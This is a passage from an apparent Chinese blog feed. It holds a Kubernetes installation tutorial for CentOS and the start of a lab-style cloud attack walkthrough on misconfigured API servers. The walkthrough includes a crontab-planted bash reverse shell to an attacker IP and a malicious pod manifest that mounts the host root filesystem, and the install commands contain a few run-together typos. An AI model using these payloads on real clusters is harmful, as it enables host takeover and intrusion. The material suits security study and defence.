href="https://blog.csdn.net/weixin_68792404/article/details/147272888">https://blog.csdn.net/weixin_68792404/article/details/147272888</a></p><p>解决方法:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/yum.repos.d</span><br><span class="line">cp  CentOS-Base.repo   CentOS-Base.repo.backup</span><br><span class="line">vi CentOS-Base.repo</span><br><span class="line">修改内容</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">CentOS-Base.repo</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># The mirror system uses the connecting IP address of the client and the</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">update status of each mirror to pick mirrors that are updated to and</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">geographically close to the client.  You should use this <span class="keyword">for</span> CentOS updates</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">unless you are manually picking other mirrors.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># If the mirrorlist= does not work for you, as a fall back you can try the</span></span> </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">remarked out baseurl= line instead.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment">#</span></span></span><br><span class="line"> </span><br><span class="line">[base]</span><br><span class="line">name=CentOS-$releasever - Base</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">mirrorlist=http://mirrorlist.centos.org/?release=<span class="variable">$releasever</span>&amp;<span class="built_in">arch</span>=<span class="variable">$basearch</span>&amp;repo=os&amp;infra=<span class="variable">$infra</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">baseurl=http://mirror.centos.org/centos/<span class="variable">$releasever</span>/os/<span class="variable">$basearch</span>/</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">baseurl=http://vault.centos.org/7.9.2009/x86_64/os/</span></span><br><span class="line">baseurl=http://vault.centos.org/7.9.2009/os/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">released updates</span> </span><br><span class="line">[updates]</span><br><span class="line">name=CentOS-$releasever - Updates</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">mirrorlist=http://mirrorlist.centos.org/?release=<span class="variable">$releasever</span>&amp;<span class="built_in">arch</span>=<span class="variable">$basearch</span>&amp;repo=updates&amp;infra=<span class="variable">$infra</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">baseurl=http://mirror.centos.org/centos/<span class="variable">$releasever</span>/updates/<span class="variable">$basearch</span>/</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">baseurl=http://vault.centos.org/7.9.2009/x86_64/os/</span></span><br><span class="line">baseurl=http://vault.centos.org/7.9.2009/updates/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">additional packages that may be useful</span></span><br><span class="line">[extras]</span><br><span class="line">name=CentOS-$releasever - Extras</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">mirrorlist=http://mirrorlist.centos.org/?release=<span class="variable">$releasever</span>&amp;<span class="built_in">arch</span>=<span class="variable">$basearch</span>&amp;repo=extras&amp;infra=<span class="variable">$infra</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="variable">$baseurl</span>=http://mirror.centos.org/centos/<span class="variable">$releasever</span>/extras/<span class="variable">$basearch</span>/</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">baseurl=http://vault.centos.org/7.9.2009/x86_64/os/</span></span><br><span class="line">baseurl=http://vault.centos.org/7.9.2009/extras/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">additional packages that extend functionality of existing packages</span></span><br><span class="line">[centosplus]</span><br><span class="line">name=CentOS-$releasever - Plus</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">mirrorlist=http://mirrorlist.centos.org/?release=<span class="variable">$releasever</span>&amp;<span class="built_in">arch</span>=<span class="variable">$basearch</span>&amp;repo=centosplus&amp;infra=<span class="variable">$infra</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">baseurl=http://mirror.centos.org/centos/<span class="variable">$releasever</span>/centosplus/<span class="variable">$basearch</span>/</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">baseurl=http://vault.centos.org/7.9.2009/x86_64/os/</span></span><br><span class="line">baseurl=http://vault.centos.org/7.9.2009/centosplus/$basearch/</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=0</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7</span><br></pre></td></tr></table></figure><p>保存后执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo yum clean all</span><br><span class="line">sudo yum makecache</span><br></pre></td></tr></table></figure><p>然后执行以下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class="line"> </span><br><span class="line">sudo yum clean all</span><br><span class="line">sudo yum makecache</span><br></pre></td></tr></table></figure><h3 id="1-安装-Docker（国内镜像加速）"><a href="#1-安装-Docker（国内镜像加速）" class="headerlink" title="1. 安装 Docker（国内镜像加速）"></a>1. 安装 Docker（国内镜像加速）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用阿里云 Docker 仓库</span></span><br><span class="line">yum install -y yum-utils</span><br><span class="line">yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装指定版本 Docker</span></span><br><span class="line">yum install -y docker-ce-20.10.23 docker-ce-cli-20.10.23 containerd.io</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置 Docker 镜像加速和 cgroup 驱动</span></span><br><span class="line">mkdir -p /etc/docker</span><br><span class="line">cat &lt;&lt;EOF &gt; /etc/docker/daemon.json</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://&lt;你的阿里云镜像加速地址&gt;.mirror.aliyuncs.com&quot;],</span><br><span class="line">  &quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;],</span><br><span class="line">  &quot;log-driver&quot;: &quot;json-file&quot;,</span><br><span class="line">  &quot;log-opts&quot;: &#123;&quot;max-size&quot;: &quot;100m&quot;&#125;,</span><br><span class="line">  &quot;storage-driver&quot;: &quot;overlay2&quot;</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动 Docker</span></span><br><span class="line">systemctl enable docker &amp;&amp; systemctl start docker</span><br></pre></td></tr></table></figure><h2 id="三、安装-Kubernetes-组件（所有节点执行）"><a href="#三、安装-Kubernetes-组件（所有节点执行）" class="headerlink" title="三、安装 Kubernetes 组件（所有节点执行）"></a>三、安装 Kubernetes 组件（所有节点执行）</h2><h3 id="1-配置阿里云-Kubernetes-仓库"><a href="#1-配置阿里云-Kubernetes-仓库" class="headerlink" title="1. 配置阿里云 Kubernetes 仓库"></a>1. 配置阿里云 Kubernetes 仓库</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt;EOF &gt; /etc/yum.repos.d/kubernetes.repo</span><br><span class="line">[kubernetes]</span><br><span class="line">name=Kubernetes</span><br><span class="line">baseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=0</span><br><span class="line">repo_gpgcheck=0</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><h3 id="2-安装-kubeadm、kubelet、kubectl"><a href="#2-安装-kubeadm、kubelet、kubectl" class="headerlink" title="2. 安装 kubeadm、kubelet、kubectl"></a>2. 安装 kubeadm、kubelet、kubectl</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定版本安装（示例版本 1.28.2）</span></span><br><span class="line">yum install -y kubelet-1.28.2 kubeadm-1.28.2 kubectl-1.28.2 --disableexcludes=kubernetes</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动 kubelet</span></span><br><span class="line">systemctl enable kubelet &amp;&amp; systemctl start kubelet</span><br></pre></td></tr></table></figure><h2 id="四、初始化-Master-节点"><a href="#四、初始化-Master-节点" class="headerlink" title="四、初始化 Master 节点"></a>四、初始化 Master 节点</h2><p>安装网络插件:<br>使用containerd配置k8s</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//没有文件可以创建/etc/containerd</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">mkdir</span> /etc/containerd</span></span><br><span class="line">containerd config default &gt; /etc/containerd/config.tomlgrep sandboximage /etc/containerd/config.toml</span><br><span class="line"></span><br><span class="line">sed -i &quot;s#k8s.gcr.io/pause#registry.aliyuncs.com/google containers/pause#g&quot; /etc/containerd/config.toml</span><br><span class="line"></span><br><span class="line">sed -i &quot;s#registry.k8s.io/pause#registry.aliyuncs.com/google_containers/pause#g&quot; /etc/containerd/config.toml</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">配置containerd cgroup驱动程序systemd：</span></span><br><span class="line">sed -i &#x27;s#Systemdcgroup =false#Systemdcgroup = true#g&#x27; /etc/containerd/config.toml</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改配置文件/etc/containerd/config.toml，145行添加config_path</span></span><br><span class="line">144   [plugins.&quot;io.containerd.grpc.v1.cri&quot;.registry]</span><br><span class="line">145        config_path=&quot;/etc/containerd/certs.d&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建对应目录</span></span><br><span class="line">mkdir -p /etc/containerd/certs.d/docker.io</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">配置加速</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">配置阿里云镜像</span></span><br><span class="line">cat &gt;/etc/containerd/certs.d/docker.io/hosts.toml &lt;&lt;EOF</span><br><span class="line">server =&quot;https://docker.io&quot;</span><br><span class="line">[host.&quot;https://ms9glx6x.mirror.aliyuncs.com&quot;]</span><br><span class="line"> capabilities =[&quot;pull&quot;,&quot;resolve&quot;]</span><br><span class="line">[host.&quot;https://docker.mirrors.ustc.edu.cn&quot;]</span><br><span class="line"> capabilities =[&quot;pull&quot;,&quot;resolve&quot;]</span><br><span class="line">[host.&quot;https://registry-1.docker.io&quot;]</span><br><span class="line"> capabilities =[&quot;pull&quot;,&quot;resolve&quot; ,&quot;push&quot;]</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><p>上面步骤所有节点都要操作</p><p>只操作k8s-master，生成管理节点的组件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kubeadm config print init-defaults &gt; kubeadm.yaml</span><br><span class="line">kubeadm init --config kubeadm.yaml</span><br><span class="line">vim kueadm.yaml</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">kueadm.yaml</span></span><br><span class="line">advertiseAddress: 192.168.200.148   #更换为master主机ip</span><br><span class="line">nodeRegistration:</span><br><span class="line">  criSocket: unix:///var/run/containerd/containerd.sock</span><br><span class="line">  imagePullPolicy: IfNotPresent</span><br><span class="line">  name: k8s-master    #更换为master的主机名</span><br><span class="line">imageRepository: registry.aliyuncs.com/google_containers  # 替换为国内镜像源</span><br><span class="line">kubernetsVersion: 1.24.4   #改为本机安装的版本</span><br><span class="line">在networking:下加入</span><br><span class="line">podSubnet: 10.244.0.0/16  #添加pod子网</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看需要使用的镜像列表,若无问题，将得到如下列表</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">kubeadm config images list --config kubeadm.yaml</span></span><br><span class="line">registry.aliyuncs.com/google </span><br><span class="line">containers/kube-apiserver:v1.24.4registry.aliyuncs.com/google_containers/kube-controller-manager:v1.24.4</span><br><span class="line">registry.aliyuncs.com/google containers/kube-scheduler:v1.24.4</span><br><span class="line">registry.aliyuncs.com/google containers/kube-proxy:v1.24.4</span><br><span class="line">registry.aliyuncs.com/google containers/pause:3.7</span><br><span class="line">registry.aliyuncs.com/google containers/etcd:3.5.3-0</span><br><span class="line">registry.aliyuncs.com/google containers/coredns:v1.8.6</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">提前下载镜像到本地</span></span><br><span class="line">[root@k8s-master ~]#kubeadm config images pull --config kubeadm.yaml</span><br><span class="line"></span><br><span class="line">[config/images] Pulled registry.aliyuncs.com/google containers/kube-apiserver:v1.24.4</span><br><span class="line">[config/images] Pulled registry.aliyuncs.com/google_containers/kube-controller-manager:v1.24.4</span><br><span class="line">[config/images] Pulled registry.aliyuncs.com/google_containers/kube-scheduler:v1.24.4</span><br><span class="line">[config/images] Pulled registry.aliyuncs.com/google containers/kube-proxy:v1.24.4</span><br><span class="line">[config/images] Pulled registry.aliyuncs.com/google containers/pause:3.7</span><br><span class="line">[config/images] Pulled registry.aliyuncs.com/google containers/etcd:3.5.3-0</span><br><span class="line">[config/images] Pulled registry.aliyuncs.com/google containers/coredns:v1.8.6</span><br><span class="line">**配置 kubelet 使用 Docker**</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>初始化 master 节点</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubeadm init --config kubeadm.yaml</span><br></pre></td></tr></table></figure><p>根据提示执行以下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p $HOME/.kube</span><br><span class="line">sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config</span><br><span class="line">sudo chown $(id -u):$(id -g) $HOME/.kube/config</span><br></pre></td></tr></table></figure><p>会出现以下提示，将node节点加入到master中</p><p>kubeadm token create –print-join-command 可以查看加入集群的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kubeadm join 192.168.200.148:6443 --token abcdef.0123456789abcdef \</span><br><span class="line">--discovery-token-ca-cert-hash sha256:9639e444338138f5324bb769ff4898f67e906d43471adeadf2459529f681ef2d </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果出现一种情况，检测到多个 CRI（容器运行时接口）端点，无法自动选择使用哪一个，需要指定CRI</span></span><br><span class="line">--cri-socket unix:///var/run/containerd/containerd.sock #指定containerd</span><br></pre></td></tr></table></figure><p>这样就成功加入到master集群中了</p><p>由于它们是Noready状态，所以需要加入网络</p><p><strong>安装网络插件:</strong><br>flannel安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下载下来后，如果主机有多个网卡，需要指定网卡</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改配置文件，kube-flannel.yml</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在文件的160行左右</span></span><br><span class="line">args:</span><br><span class="line">- --ip-masq</span><br><span class="line">- --kube-subnet-mgr</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">添加以下代码</span></span><br><span class="line">- --iface=ens33</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f kube-flannel.yml   #取下载镜像</span><br><span class="line">kubectl -n kube-flannel get po -owide -w #等待初始化镜像的拉取</span><br></pre></td></tr></table></figure><pre><code class="language-shell"># vi kube-flannel.ymlnet-conf.json: |  &#123;    &quot;Network&quot; : 10.244.0.0/16   #需要与配置pod子网一致    &quot;Backend&quot; : &#123;&#125;  &#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 云安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 云安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云攻防-K8S安全</title>
      <link href="/2025/06/17/%E4%BA%91%E6%94%BB%E9%98%B2-K8S%E5%AE%89%E5%85%A8/"/>
      <url>/2025/06/17/%E4%BA%91%E6%94%BB%E9%98%B2-K8S%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="云攻防-K8S安全"><a href="#云攻防-K8S安全" class="headerlink" title="云攻防-K8S安全"></a>云攻防-K8S安全</h1><p>Kubernetes 是一个开源的，用于编排云平台中多个主机上的容器化的应用，目标是让<br>部署容器化的应用能简单并且高效的使用，提供了应用部署，规划，更新，维护的一种机<br>制。其核心的特点就是能够自主的管理容器来保证云平台中的容器按照用户的期望状态运<br>行着，管理员可以加载一个微型服务，让规划器来找到合适的位置，同时，Kubernetes<br>在系统提升工具以及人性化方面，让用户能够方便的部署自己的应用。</p><p>参考：</p><p><a href="https://blog.csdn.net/qq_34101364/article/details/122506768">https://blog.csdn.net/qq_34101364/article/details/122506768</a></p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-2.png"></p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image.png"></p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-1.png"></p><h2 id="K8S-集群攻击点"><a href="#K8S-集群攻击点" class="headerlink" title="K8S 集群攻击点"></a>K8S 集群攻击点</h2><p>随着越来越多企业开始上云的步伐，在攻防演练中常常碰到云相关的场景，例：公有云、</p><p>私有云、混合云、虚拟化集群等。以往渗透路径「外网突破 -&gt; 提权 -&gt; 权限维持 -&gt; 信息收</p><p>集 -&gt; 横向移动 -&gt; 循环收集信息」，直到获得重要目标系统。但随着业务上云以及虚拟化技</p><p>术的引入改变了这种格局，也打开了新的入侵路径，例如：</p><ul><li><p>1、通过虚拟机攻击云管理平台，利用管理平台控制所有机器</p></li><li><p>2、通过容器进行逃逸，从而控制宿主机以及横向渗透到 K8s Master 节点控制所有容器</p></li><li><p>3、利用 KVM-QEMU &#x2F; 执行逃逸获取宿主机，进入物理网络横向移动控制云平台</p></li></ul><p>目前互联网上针对云原生场景下的攻击手法零零散散的较多，仅有一些厂商发布过相关矩</p><p>阵技术，但没有过多的细节展示，本文基于微软发布的 Kubernetes 威胁矩阵进行扩展，介绍相关的具体攻击方法。</p><p>参考：</p><p><a href="https://mp.weixin.qq.com/s/yQoqozJgP8F-ad24xgzIPw">https://mp.weixin.qq.com/s/yQoqozJgP8F-ad24xgzIPw</a></p><p><a href="https://mp.weixin.qq.com/s/QEuQa0KVwykrMzOPdgEHMQ">https://mp.weixin.qq.com/s/QEuQa0KVwykrMzOPdgEHMQ</a></p><p>cat &#x2F;proc&#x2F;1&#x2F;cgroup &#x2F;&#x2F; 查看是否存在 K8S</p><h2 id="一，api-未授权访问"><a href="#一，api-未授权访问" class="headerlink" title="一，api 未授权访问"></a>一，api 未授权访问</h2><h3 id="1，-攻击-8080-端口"><a href="#1，-攻击-8080-端口" class="headerlink" title="1， 攻击 8080 端口"></a>1， 攻击 8080 端口</h3><p>API Server 未授权访问旧版本的 k8s 的 API Server 默认会开启两个端口：8080 和 6443。6443 是安全端口，安全端口使用 TLS 加密；但是 8080 端口无需认证，仅用于测试。6443 端口需要认证，且有 TLS 保护。(k8s&lt;1.16.0) 新版本 k8s 默认已经不开启 8080。需要更改相应的配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/kubernetes/manifests/</span><br><span class="line">--insecure-port=8080</span><br><span class="line">--insecure-bind-address=0.0.0.0</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kubectl.exe -s 192.168.139.130:8080 get nodes</span><br><span class="line">kubectl.exe -s 192.168.139.130:8080 get pods</span><br><span class="line">//连接后创建test.yaml文件</span><br><span class="line">kubectl -s 192.168.139.130:8080 create -f test.yaml</span><br><span class="line">//同过api server 创建test.yaml文件来创建一个新的pod</span><br><span class="line">kubectl -s 192.168.139.130:8080--namespace=default exec -it test </span><br><span class="line">bash </span><br><span class="line">echo -e &quot;***** root bash -i &gt;&amp; /dev/tcp/192.168.139.128/4444 0&gt;&amp;1\n&quot; &gt;&gt; /mnt/etc/crontab</span><br><span class="line">//写入定时任务，执行反弹shell</span><br></pre></td></tr></table></figure><p>test.yaml 中的内容</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-5.png"></p><h3 id="2、攻击-6443-端口"><a href="#2、攻击-6443-端口" class="headerlink" title="2、攻击 6443 端口"></a>2、攻击 6443 端口</h3><p>API Server 未授权访问一些集群由于鉴权配置不当，将”system:anonymous” 用户绑定到”cluster-admin” 用户组，从而使 6443 端口允许匿名用户以管理员权限向集群内部下发指令。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl create clusterrolebinding system:anonymous</span><br><span class="line">--clusterrole=cluster-admin            --user=system:anonymous</span><br></pre></td></tr></table></figure><p>攻击时访问 6443 端口，存在此情况那么可以尝试攻击</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-05-12-205753.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-创建恶意 pods</span><br><span class="line">https://192.168.139.130:6443/api/v1/namespaces/default/pods/</span><br><span class="line">//构建数据包POST</span><br><span class="line">&#123;&quot;apiVersion&quot; : &quot;v1&quot; ,&quot;kind&quot; : &quot;Pod&quot; , &quot;metadata&quot;: &#123;&quot;annotations&quot; : &#123;&quot;kubect.kubernetes.io/last-applied-configuration&quot; :&quot;&#123;\&quot;apiVersion\&quot;:\&quot;v1\,\&quot;kind\&quot; : \&quot;Pod\&quot; ,\&quot;metadata\&quot;: &#123;\&quot;annotations\&quot;: &#123;&#125; ,\&quot;name\&quot;:\&quot;tes02\&quot; ,\&quot;namespace\&quot;:\&quot;default\&quot;&#125;,\&quot;spec\&quot;: &#123;\&quot;containers\&quot; :[&#123;\&quot;image\&quot; : \&quot;nginx:1.14.2\&quot;,\&quot;name\&quot;:\&quot;test02\&quot;,\&quot;volumeMounts\&quot; :[&#123;\&quot;mountPath\&quot;:\&quot;/host\&quot;,\&quot;name\&quot;:\&quot;host\&quot;&#125;]&#125;],\&quot;volumes\&quot;:[&#123;\&quot;hostPath\&quot;:&#123;\&quot;path\&quot; :\&quot;/\&quot; ,\&quot;type\&quot;:\&quot;Directory\&quot;&#125; ,\&quot;name\&quot;:\&quot;host\&quot; &#125;]&#125; &#125;\n&quot;&#125;&quot;name&quot; : &quot;test02&quot; ,&quot;namespace&quot; :&quot;default&quot;&#125;,&quot;spec&quot; : &#123;&quot;containers&quot; :[&#123;&quot;image&quot;:&quot;nginx:1.14.2&quot;,&quot;name&quot;:&quot;test02&quot;,&quot;volumeMounts&quot; :[&#123;&quot;mountPath&quot;:&quot;/host&quot; ,&quot;name&quot; :&quot;host&quot; &#125; ]&#125;],&quot;volumes&quot; : [ &#123;&quot;hostPath&quot; : &#123;&quot;path&quot; :&quot;/&quot; ,&quot;type&quot;&quot;Directory&quot;&#125;,&quot;name&quot;:&quot;host&quot;&#125;]&#125; &#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-连接判断pods</span><br><span 